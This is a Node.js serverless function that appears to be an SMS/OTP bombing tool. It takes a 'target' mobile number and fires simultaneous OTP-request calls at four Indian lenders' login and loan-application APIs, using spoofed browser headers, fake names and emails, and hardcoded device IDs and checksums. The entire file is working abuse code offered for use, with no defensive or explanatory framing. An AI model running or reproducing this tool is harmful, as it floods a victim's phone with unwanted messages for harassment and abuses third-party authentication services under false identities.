const axios = require('axios');

module.exports = async (req, res) => {
    const { mob } = req.query;

    if (!mob || mob.length < 10) {
        return res.status(400).json({ error: "Valid 10-digit number required" });
    }

    // Common headers
    const commonHeaders = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'Referer': 'https://www.google.com/'
    };

    // Helper to handle different API formats (Form vs JSON)
    const safePost = async (url, data, isJson = false) => {
        try {
            const body = isJson ? data : new URLSearchParams(data).toString();
            const headers = {
                ...commonHeaders,
                'Content-Type': isJson ? 'application/json' : 'application/x-www-form-urlencoded'
            };
            
            const response = await axios.post(url, body, { headers, timeout: 5000 });
            return response.status;
        } catch (error) {
            return error.response ? error.response.status : "failed";
        }
    };

    // Execute all 4 APIs simultaneously
    const [avanse, bright, stashfin, incred] = await Promise.all([
        // 1. Avanse (Form)
        safePost('https://www.avanse.com/common-loan-apply/otp', {
            'contactNumber': mob,
            'pageUrl': 'New Student Loan',
            'name': 'Ckv Jvn',
            'emailId': 'newuser.comop@gmail.com'
        }),
        // 2. BrightLoans (Form)
        safePost('https://brightloans.in/login-sbm', {
            'mobile': mob,
            'current_page': 'login',
            'device_id': '3c2f1fb977b9f389dc7e60f5f3fa9c44'
        }),
        // 3. Stashfin (Form)
        safePost('https://api.stashfin.com/v2/api/', {
            'phone': mob,
            'mode': 'generate_otp',
            'checksum': 'f5d551b1531459cf6eee963f0476fc7b6079d9dd01a46e33beb7677d5e021e3c'
        }),
        // 4. InCred (JSON)
        safePost('https://gateway-api.incred.com/website-bff/public/v1/common/login/otpgenerate', {
            "MOBILE": mob,
            "UTM_DETAILS": {
                "partnerId": "9250608873861026P",
                "utm_source": "google",
                "utm_medium": "cpc",
                "utm_campaign": "ww_search_personal_loan_new_flow_brand_keywords_ag1_ad1",
                "utm_term": "incred",
                "gad_source": "1"
            },
            "ON_BOARDING_TYPE": "FROM_LOAN_ENQUIRY",
            "STATUS": "Pending"
        }, true) // 'true' tells the script to send as JSON
    ]);

    res.status(200).json({
        success: true,
        target: mob,
        results: { avanse, bright, stashfin, incred }
    });
};
